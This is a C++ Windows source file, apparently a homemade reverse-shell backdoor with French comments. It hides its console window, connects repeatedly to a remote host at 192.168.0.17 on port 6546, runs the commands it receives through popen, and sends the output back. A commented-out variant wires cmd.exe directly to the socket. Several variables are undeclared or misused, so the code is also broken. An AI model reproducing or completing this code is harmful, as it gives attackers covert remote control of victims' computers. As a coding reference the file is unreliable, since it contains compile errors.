//#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <cstdio>
#include <ctime>
#include <pthread.h>
#include <string>
#include <algorithm>
#include <sstream>
#include <iostream>
#include <fstream>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
HWND hConsole;


using namespace std;

HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024 // Buffer size for console window titles.
       HWND hwndFound;         // This is what is returned to the caller.
       char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
                                           // WindowTitle.
       char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
                                           // WindowTitle.
       // Fetch current window title.
       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       // Format a "unique" NewWindowTitle.
       wsprintf(pszNewWindowTitle,"%d/%d", GetTickCount(), GetCurrentProcessId());
       // Change current window title.
       SetConsoleTitle(pszNewWindowTitle);
       // Ensure window title has been updated.
       Sleep(40);
       // Look for NewWindowTitle.
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       // Restore original window title.
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}
void* listenCMD(void* args)
{
    //SOCKET sock = *(SOCKET*)sockP;
    char buffer[4069];
    while(1)
    {
        if (fgets(buffer, sizeof(buffer), ptr) != NULL)
        {
            send(sock, buffer, sizeof(buffer), 0); //renvoi du retour de commande     
        }   
    }
}


void* listenT(void* sockP)
{
    pthread_t t2;
	SOCKET sock = *(SOCKET*)sockP;	//trad du pointeur vers le socket
    FILE *ptr;	//déclaration de FILE pour popen
    struct args
    {
        SOCKET sockArg;
        FILE *ptrArg;
    };
    args arg1 = {sock, ptr};
    pthread_create(&t2, NULL, listenCMD, &args);
	char buffer[2024];
	char buffer1[1024];
    string compare;
	while(1)
	{
        recv(sock, buffer, sizeof(buffer), 0); //reception des commandes
        compare = buffer;   //Conversion de la commande recu en string
        /* string str(buffer);         
        istringstream iss(str);     //Declaration d'un flux 'isstring'
        string subs;
        iss >> subs;
        strncpy(buffer, subs.c_str(), sizeof(buffer));
        send(sock, buffer, sizeof(buffer), 0);
        bzero(buffer, sizeof(buffer)); */

        if (compare == "ls")
            ptr = popen("dir", "r");
        else
            ptr = popen(buffer, "r");	//écriture de la commande


		ptr = popen("cd", "r");	//récupération de la position du programme
		//fgets(buffer1, sizeof(buffer1), ptr);
        memset(buffer, 0, sizeof(buffer));
		strncat(buffer, "<", 1);	
		strncat(buffer, buffer1, sizeof(buffer1)); 	//Joli design
		//send(sock, buffer, sizeof(buffer), 0); 	//envoi du joli design
		
        pclose(ptr);	//fermeture du joli fichier
    }
}


int main(int argc, _TCHAR* argv[])
{
    cout << "started" << endl;
    SOCKET s1;
	pthread_t t1;
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    hax.sin_family = AF_INET;
    hax.sin_port = htons(6546);
    hax.sin_addr.s_addr = inet_addr("192.168.0.17");
    int test;
    while(test != 0)
    {
       test = WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    }
	pthread_create(&t1, NULL, listenT, (void*)&s1);
    memset(&sui, 0, sizeof(sui));
    pthread_join(t1, NULL);

    return 0;

/*       sui.cb = sizeof(sui);
      sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
      sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

      TCHAR commandLine[256] = "cmd.exe";
      CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); */
}
